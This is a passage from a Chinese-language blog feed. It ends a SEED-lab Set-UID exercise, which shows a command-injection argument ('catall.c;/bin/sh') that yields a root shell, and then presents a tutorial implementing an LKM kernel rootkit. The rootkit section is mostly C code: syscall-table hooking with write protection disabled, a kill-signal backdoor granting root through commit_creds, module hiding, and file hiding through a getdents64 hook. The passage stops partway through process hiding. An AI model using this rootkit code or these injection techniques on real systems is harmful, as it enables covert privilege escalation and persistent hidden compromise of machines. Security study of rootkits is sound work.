Invoking External Programs Using system() versus execve()"></a>Task 8: Invoking External Programs Using system() versus execve()</h1><ul><li><p>system()会执行sh -c “a.out 1;/bin/sh”因此可以得到root权限的shell</p></li><li><p>execve不可以</p></li></ul><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>ll a.out <br>-rwsr-xr-x <span class="hljs-number">1</span> root seed <span class="hljs-number">16928</span> Oct <span class="hljs-number">31</span> <span class="hljs-number">12</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> a.out<br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>a.out <span class="hljs-string">&quot;catall.c;/bin/sh&quot;</span><br><span class="hljs-comment">#</span><br><br>[<span class="hljs-number">10</span>/<span class="hljs-number">31</span>/<span class="hljs-number">22</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/lab/Labsetup</span><span class="hljs-variable">$ </span>a.out <span class="hljs-string">&quot;catall.c;/bin/sh&quot;</span><br>/bin/<span class="hljs-symbol">cat:</span> <span class="hljs-string">&#x27;catall.c;/bin/sh&#x27;</span>: No such file <span class="hljs-keyword">or</span> directory<br></code></pre></td></tr></table></figure><h1 id="Task-9-Capability-Leaking"><a href="#Task-9-Capability-Leaking" class="headerlink" title="Task 9: Capability Leaking"></a>Task 9: Capability Leaking</h1><blockquote><p>The setuid() system call can be<br>used to revoke the privileges. According to the manual, “setuid() sets the effective user ID of the calling<br>process. If the effective UID of the caller is root, the real UID and saved set-user-ID are also set”. Therefore,<br>if a Set-UID program with effective UID 0 calls setuid(n), the process will become a normal process,<br>with all its UIDs being set to n</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> fd;<br>  <span class="hljs-keyword">char</span> *v[<span class="hljs-number">2</span>];<br><br>  <span class="hljs-comment">/* Assume that /etc/zzz is an important system file,</span><br><span class="hljs-comment">   * and it is owned by root with permission 0644.</span><br><span class="hljs-comment">   * Before running this program, you should create</span><br><span class="hljs-comment">   * the file /etc/zzz first. */</span><br>  fd = open(<span class="hljs-string">&quot;/etc/zzz&quot;</span>, O_RDWR | O_APPEND);        <br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Cannot open /etc/zzz\n&quot;</span>);<br>     <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// Print out the file descriptor value</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fd is %d\n&quot;</span>, fd);<br><br>  <span class="hljs-comment">// Permanently disable the privilege by making the</span><br>  <span class="hljs-comment">// effective uid the same as the real uid</span><br>  setuid(getuid());                                <br><br>  <span class="hljs-comment">// Execute /bin/sh</span><br>  v[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>; v[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  execve(v[<span class="hljs-number">0</span>], v, <span class="hljs-number">0</span>);                             <br>&#125;<br></code></pre></td></tr></table></figure><p>虽然上面程序放弃了特权，但是fd被泄露，因此可以使用<code>echo xxx &gt;&amp;fd</code>写入</p>]]></content>
    
    
    <categories>
      
      <category>SEED-lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>一个基于 LKM 的 Linux 内核级 rootkit 的实现</title>
    <link href="/p/cd0d68e2/"/>
    <url>/p/cd0d68e2/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/LaPhilosophie/hello-rootkit">GitHub链接</a></p><p><a href="https://github.com/LaPhilosophie/hello-rootkit/blob/main/PPT.pdf">演示Slides</a></p><h1 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h1><p>rootkit是一种恶意软件，攻击者可以在获得 root 或管理员权限后安装它，从而<strong>隐藏入侵并保持root权限访问</strong>。rootkit可以是用户级的，也可以是内核级的。关于rootkit的详细介绍可以参考<a href="https://en.wikipedia.org/wiki/rootkit">https://en.wikipedia.org/wiki/rootkit</a></p><p>有许多技术可以实现rootkit，本项目使用的是通过编写LKM（Linux kernel module）并hook系统调用表的方式。这种方式具有诸多优点，比如rootkit作为内核模块可以动态的加载和卸载，大多数rootkit也都是通过LKM的方式实现的</p><h1 id="LKM"><a href="#LKM" class="headerlink" title="LKM"></a>LKM</h1><p>一个简单的LKM示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// header file</span><br><br><span class="hljs-comment">// module info</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> __init <span class="hljs-title">example_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>printk(KERN_INFO <span class="hljs-string">&quot;Hello, World!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> __exit <span class="hljs-title">example_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>printk(KERN_INFO <span class="hljs-string">&quot;Goodbye, World!\n&quot;</span>);<br>&#125;<br><br>module_init(example_init);<br>module_exit(example_exit);<br></code></pre></td></tr></table></figure><p>在完成了对应Makefile的编写之后，使用<code>make</code>命令可以编译出ko文件（kernel object），使用<code>insmod rootkit.ko</code>命令可以安装内核模块，使用<code>rmmod rootkit</code>可以卸载rootkit模块，使用<code>dmesg</code>命令可以打印程序中printk的信息</p><h1 id="hook系统调用"><a href="#hook系统调用" class="headerlink" title="hook系统调用"></a>hook系统调用</h1><p>用户进程通过系统调用使用内核服务。系统调用会进入内核，让内核执行服务然后返回，关于系统调用的更多信息，可以使用<code>man -k syscall</code>获取。如下图所示，hook可以劫持正常的系统调用，让内核执行我们自行设计的函数，从而实现我们自己想要的功能</p><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/hook.png" alt="hook"></p><p>比如，当用户使用ls命令列出该目录下所有文件的时候，本质上是使用了<code>getdents64</code>系统调用，如果我们将<code>getdents64</code>的<strong>地址替换</strong>为我们自己构造的函数<code>hook_getdents64</code> ，即可劫持系统调用流程。因此，只要我们分析清楚了某一个shell命令底层所执行的系统调用，并成功对其进行hook，那么就可以成功实现rootkit的种种目的</p><p><code>strace </code> 命令可以对系统调用进行跟踪，这可以帮助我们分析命令的函数调用链</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> strace -c ls</span><br><span class="hljs-meta">%</span><span class="bash"> time     seconds  usecs/call     calls    errors syscall</span><br>------ ----------- ----------- --------- --------- ----------------<br>  0.00    0.000000           0         8           read<br>  0.00    0.000000           0         1           write<br>  0.00    0.000000           0        13           close<br>  0.00    0.000000           0        12           fstat<br>  0.00    0.000000           0        32           mmap<br>  0.00    0.000000           0         9           mprotect<br>  0.00    0.000000           0         2           munmap<br>  0.00    0.000000           0         3           brk<br>  0.00    0.000000           0         2           rt_sigaction<br>  0.00    0.000000           0         1           rt_sigprocmask<br>  0.00    0.000000           0         2           ioctl<br>  0.00    0.000000           0         8           pread64<br>  0.00    0.000000           0         2         1 access<br>  0.00    0.000000           0         1           execve<br>  0.00    0.000000           0         1           readlink<br>  0.00    0.000000           0         2         2 statfs<br>  0.00    0.000000           0         2         1 arch_prctl<br>  0.00    0.000000           0         2           getdents64<br>  0.00    0.000000           0         1           set_tid_address<br>  0.00    0.000000           0        11           openat<br>  0.00    0.000000           0         1           set_robust_list<br>  0.00    0.000000           0         1           prlimit64<br>------ ----------- ----------- --------- --------- ----------------<br>100.00    0.000000                   117         4 total<br></code></pre></td></tr></table></figure><p>回到hook系统调用这个事情上来，内核中有一张<a href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">系统调用表</a>，存放了所有的系统调用的地址，我们需要找到这张表的地址，才能对系统调用“偷梁换柱”——将原本的syscall的地址替换为我们自己实现的syscall地址。也可以将系统调用表看做是一个数组，系统调用号为其索引，不同的系统调用号对应着不同的系统调用。需要小心的是，相同的系统调用函数，对于不同的架构，调用号是不同的。<a href="https://marcin.juszkiewicz.com.pl/download/tables/syscalls.html">这个页面</a>列出了 Linux 支持的架构的所有系统调用</p><p>查找系统调用表的地址有很多方法，比如：</p><ul><li>使用kallsyms</li><li>使用ftrace</li><li>暴力枚举</li></ul><p>注意，由于rootkit与系统内核版本是强相关的，所以对于不同的内核，查找系统调用表的方式也不同，比如有的版本的内核无法使用kallsyms得到系统调用表地址，那么就可以考虑使用ftrace</p><p>使用kallsyms：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//函数声明，real_sys_openat是真实的sys_openat函数</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> asmlinkage <span class="hljs-title">long</span> <span class="hljs-params">(*real_sys_openat)</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><br><span class="hljs-comment">//函数声明,hook_sys_openat我们自己实现的sys_openat函数</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_sys_openat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><br><span class="hljs-comment">//获取系统调用表地址</span><br>real_sys_call_table = (<span class="hljs-keyword">void</span> *)kallsyms_lookup_name(<span class="hljs-string">&quot;sys_call_table&quot;</span>);<br><br><span class="hljs-comment">//保存原来的kill函数的地址，最后需要恢复原状</span><br>real_sys_openat = (<span class="hljs-keyword">void</span> *)real_sys_call_table[__NR_openat];<br><br><span class="hljs-comment">// 关闭写保护</span><br>disable_wp();<br><br><span class="hljs-comment">//将真实的sys_openat函数地址映射到我们自己写的openat函数地址处，偷梁换柱</span><br>real_sys_call_table[__NR_openat] = (<span class="hljs-keyword">void</span> *)my_sys_openat;<br><br><span class="hljs-comment">// 恢复现场，打开写保护</span><br>enable_wp();<br></code></pre></td></tr></table></figure><p>使用ftrace：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//在头文件中写上hook数组</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ftrace_hook</span> <span class="hljs-title">hooks</span>[] =</span> &#123;<br>    HOOK(<span class="hljs-string">&quot;__x64_sys_mkdir&quot;</span>, hook_mkdir, &amp;orig_mkdir),<br>    HOOK(<span class="hljs-string">&quot;__x64_sys_getdents&quot;</span>, hook_getdents, &amp;orig_getdents)&#125;;<br>    <br><span class="hljs-comment">//在模块初始化时执行hook安装</span><br>fh_install_hooks(hooks, ARRAY_SIZE(hooks));<br><br><span class="hljs-comment">//在模块卸载化时执行hook卸载</span><br>fh_remove_hooks(hooks, ARRAY_SIZE(hooks));<br></code></pre></td></tr></table></figure><p>在某些内核版本中，<code>/proc/kallsyms</code>文件存储了系统调用吧和系统调用的地址信息，我们可以使用命令行获取：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /proc/kallsyms | grep xxx<br></code></pre></td></tr></table></figure><p>同样的，对于不同的内核，系统调用函数的声明不同，这是一个对比：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 旧</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getdents</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd, struct linux_dirent *dirp,</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span></span>;<br><br><span class="hljs-comment">// 新</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">sys_getdents</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd,</span></span><br><span class="hljs-params"><span class="hljs-function">struct linux_dirent __user *dirent,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span></span>;<br></code></pre></td></tr></table></figure><p><code>asmlinkage</code>是一个宏，告诉编译器在 CPU 堆栈上查找函数参数，而不是寄存器。众所周知，用户态程序调用syscall的时候，会下陷到内核态，此时会保存 CPU 堆栈中的所有寄存器（eax、ebx、ecx 等）。因此，从用户空间传递到内核空间的有关参数的信息都被保存在堆栈中，这也即是使用<code>asmlinkage</code>的原因</p><p>对于新的系统调用，存储在寄存器中的参数会先被复制到<code>pt_regs</code>结构体中，因此当我们编写hook函数的时候，需要先从这个结构体中获取对应的参数值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//函数声明,hook_sys_openat我们自己实现的sys_openat函数</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_sys_openat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br></code></pre></td></tr></table></figure><p>此外由于内核空间和用户空间是隔离的，地址的映射并不互通，因此需要使用<code>copy_to_user</code>和<code>copy_from_user</code>进行数据的传输</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><ul><li><p><code>cred</code>是一个记录进程credentials信息的结构体，具体定义在<code>cred.c</code>头文件中</p></li><li><p><code>prepare_creds()</code>返回当前进程的<code>cred</code>结构</p></li><li><p><code>commit_creds()</code>将这个cred应用于当前进程，因此我们只需要对cred结构体进行修改即可实现提权</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">newcreds</span>;</span><br>    newcreds = prepare_creds();<br>    <span class="hljs-keyword">if</span> (newcreds == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    newcreds-&gt;uid.val = newcreds-&gt;gid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;euid.val = newcreds-&gt;egid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;suid.val = newcreds-&gt;sgid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;fsuid.val = newcreds-&gt;fsgid.val = <span class="hljs-number">0</span>;<br>    commit_creds(newcreds);<br>&#125;<br></code></pre></td></tr></table></figure><p>hook kill实现提权，当我们在shell中输入kill -64 &lt;num&gt;的时候会将shell提权到root，可以使用id命令验证这一点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_kill</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *regs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = regs-&gt;di;<br>    <span class="hljs-keyword">int</span> sig = regs-&gt;si;<br>    <span class="hljs-keyword">if</span> (sig == <span class="hljs-number">64</span>)<br>    &#123;<br>        printk(KERN_INFO <span class="hljs-string">&quot; get_root &quot;</span>);<br>        get_root();<br>    &#125;<br>    <span class="hljs-keyword">return</span> orig_kill(regs);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="模块隐藏"><a href="#模块隐藏" class="headerlink" title="模块隐藏"></a>模块隐藏</h1><p>lsmod命令可以列出已安装的内核模块，rmmod可以删除。模块隐藏也即是让lsmod命令无法输出我们的模块</p><p>内核使用module结构体存储模块信息，可以看到module封装了list双向链表，下面的源码可以在<code>module.h</code>中找到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">module_state</span> <span class="hljs-title">state</span>;</span><br><br><span class="hljs-comment">/* Member of list of modules */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><br><span class="hljs-comment">// ... and so on </span><br>&#125;<br></code></pre></td></tr></table></figure><p>为了隐藏模块，我们只需把对应rootkit模块的list从全局链表中删除即可。内核已经替我们实现了list_del和list_add函数，它们被封装在list.h头文件中，我们调用即可。在下面的代码中，THIS_MODULE宏指向当前模块的module struct</p><p>值得注意的是，为了恢复节点，我们需要临时保存节点的信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hide_myself</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;  list_del(&amp;THIS_MODULE-&gt;<span class="hljs-built_in">list</span>);  &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">show_myself</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;  list_add(&amp;THIS_MODULE-&gt;<span class="hljs-built_in">list</span>, module_prev); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">module_info</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;   module_prev = THIS_MODULE-&gt;<span class="hljs-built_in">list</span>.prev;  &#125;<br></code></pre></td></tr></table></figure><h1 id="文件隐藏"><a href="#文件隐藏" class="headerlink" title="文件隐藏"></a>文件隐藏</h1><p>ls命令可以打印出文件，为了深入研究ls做了什么，可以使用strace命令进行追踪。strace具有许多有趣的选项，比如<code>-c</code>可以打印出统计表格， <code>-p</code>可以追踪某一进程，等等 </p><p>一通分析后可以发现ls命令调用了<code>getdents64 syscall</code>（实际上有些较新的内核版本仍然会调用<code>getdents</code>函数而不是较新的<code>getdents64</code>，这个后面还会提到），该函数可以得到目录的entry，并返回读取的字节数。我们可以通过对该函数进行hook从而达到隐藏文件的目的</p><p>下面是hook_getdents64函数的设计，省略了一些报错处理和别的细节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 声明原本的getdents64函数</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> asmlinkage <span class="hljs-title">long</span> <span class="hljs-params">(*orig_getdents64)</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><span class="hljs-comment">// 声明我们设计的hook_getdents64函数</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_getdents64</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><span class="hljs-comment">// ssize_t getdents64(int fd, void *dirp, size_t count);</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">int</span> <span class="hljs-title">hook_getdents64</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *regs)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//获取寄存器中的内容</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent64</span> __<span class="hljs-title">user</span> *<span class="hljs-title">dirent</span> =</span> (struct linux_dirent64 *)regs-&gt;si;<br><span class="hljs-comment">//遍历，对希望隐藏的文件进行处理</span><br><span class="hljs-keyword">while</span> (tlen &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        len = current_dir-&gt;d_reclen;<br>        tlen = tlen - len;<br>        <span class="hljs-keyword">if</span> (check_file(current_dir-&gt;d_name))<span class="hljs-comment">//覆盖操作</span><br>        &#123;<br>            ret = ret - len;<br>            memmove(current_dir, (<span class="hljs-keyword">char</span> *)current_dir + current_dir-&gt;d_reclen, tlen);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            current_dir = (struct linux_dirent64 *)((<span class="hljs-keyword">char</span> *)current_dir + current_dir-&gt;d_reclen);<br>    &#125;<br><span class="hljs-comment">//返回正常调用的结果</span><br><span class="hljs-keyword">return</span> orig_getdents64(regs);<br>&#125;<br></code></pre></td></tr></table></figure><p>为了设计出上面的代码我们需要详细理解linux_dirent结构体和linux_dirent64结构体，它们分别对应getdents函数和getdents64函数，后者是为了处理更大的文件系统和偏移而设计的，细节如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent</span> &#123;</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>  d_ino;     <span class="hljs-comment">/* Inode number */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>  d_off;     <span class="hljs-comment">/* Offset to next linux_dirent */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> d_reclen;  <span class="hljs-comment">/* Length of this linux_dirent */</span><br>               <span class="hljs-keyword">char</span>           d_name[];  <span class="hljs-comment">/* Filename (null-terminated) */</span><br>                                 <span class="hljs-comment">/* length is actually (d_reclen - 2 -</span><br><span class="hljs-comment">                                    offsetof(struct linux_dirent, d_name)) */</span><br>               <span class="hljs-comment">/*</span><br><span class="hljs-comment">               char           pad;       // Zero padding byte</span><br><span class="hljs-comment">               char           d_type;    // File type (only since Linux</span><br><span class="hljs-comment">                                         // 2.6.4); offset is (d_reclen - 1)</span><br><span class="hljs-comment">               */</span><br>           &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent64</span> &#123;</span><br>               <span class="hljs-keyword">ino64_t</span>        d_ino;    <span class="hljs-comment">/* 64-bit inode number */</span><br>               <span class="hljs-keyword">off64_t</span>        d_off;    <span class="hljs-comment">/* 64-bit offset to next structure */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> d_reclen; <span class="hljs-comment">/* Size of this dirent */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>  d_type;   <span class="hljs-comment">/* File type */</span><br>               <span class="hljs-keyword">char</span>           d_name[]; <span class="hljs-comment">/* Filename (null-terminated) */</span><br>           &#125;;<br></code></pre></td></tr></table></figure><p>对于getdents函数的hook，与getdents64函数的hook有一些不同，这里暂且略去</p><h1 id="进程隐藏"><a href="#进程隐藏" class="headerlink" title="进程隐藏"></a>进程隐藏</h1><p>linux内核维护了task_struct和pid两个链表，分布记录了进程的task_struct结构和pid结构</p><p>想要查看当前是否有rootkit进程有两个常规操作：</p><ul><li>遍历task_struct链表</li><li>遍历/proc/pid中所有进程</li></ul><p>要想隐藏进程，就要考虑将rootkit相关的task struct和pid都摘除列表，即要从下面两点出发：</p><ul><li><p>脱离 task_struct 链表</p></li><li><p>脱离 pid 链表</p></li></ul><p>那么首先看下linux中使用的相关的结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 